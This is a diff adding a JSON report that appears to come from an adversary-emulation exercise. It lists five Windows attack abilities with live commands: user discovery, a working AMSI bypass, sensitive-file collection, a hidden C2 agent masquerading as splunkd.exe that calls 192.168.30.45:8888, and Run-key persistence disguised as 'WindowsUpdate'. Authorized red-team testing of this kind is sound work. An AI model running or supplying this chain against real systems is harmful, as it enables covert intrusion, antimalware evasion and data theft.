@@ -1,0 +1,93 @@
+{
+  "agent_paw": "qdodkl",
+  "agent_host": "PDL2",
+  "agent_platform": "windows",
+  "agent_executors": [
+    "proc",
+    "cmd",
+    "psh"
+  ],
+  "adversary_id": "temp-seed-qdodkl-1775120622",
+  "adversary_name": "Temp Seed Windows - gruppo1",
+  "referenced_ability_count": 5,
+  "compatible_count": 5,
+  "incompatible_count": 0,
+  "missing_count": 0,
+  "fixed_embedded_count": 0,
+  "compatible": [
+    {
+      "ability_id": "discovery_users",
+      "name": "User Discovery",
+      "tactic": "discovery",
+      "technique_id": "T1033",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 7,
+      "windows_command": "whoami\nwhoami /priv\nnet user\nnet localgroup administrators\n",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "amsi_bypass",
+      "name": "AMSI Bypass",
+      "tactic": "defense-evasion",
+      "technique_id": "T1562.001",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 1,
+      "windows_command": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$s.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "collection_files",
+      "name": "Sensitive File Discovery",
+      "tactic": "collection",
+      "technique_id": "T1005",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 1,
+      "windows_command": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {$_.FullName}\n",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "c2_internal",
+      "name": "Internal C2",
+      "tactic": "command-and-control",
+      "technique_id": "T1071.001",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 0,
+      "windows_command": "Start-Process C:\\Users\\Public\\splunkd.exe `\n-ArgumentList \"-server http://192.168.30.45:8888 -group red\" `\n-WindowStyle Hidden\n",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "persistence_registry",
+      "name": "Registry Persistence",
+      "tactic": "persistence",
+      "technique_id": "T1547.001",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 0,
+      "windows_command": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" `\n-Name \"WindowsUpdate\" `\n-Value \"C:\\Users\\Public\\splunkd.exe\" -Force\n",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    }
+  ],
+  "incompatible": [],
+  "missing": [],
+  "noisy_only_mode": false,
+  "seed_only_mode": false
+}
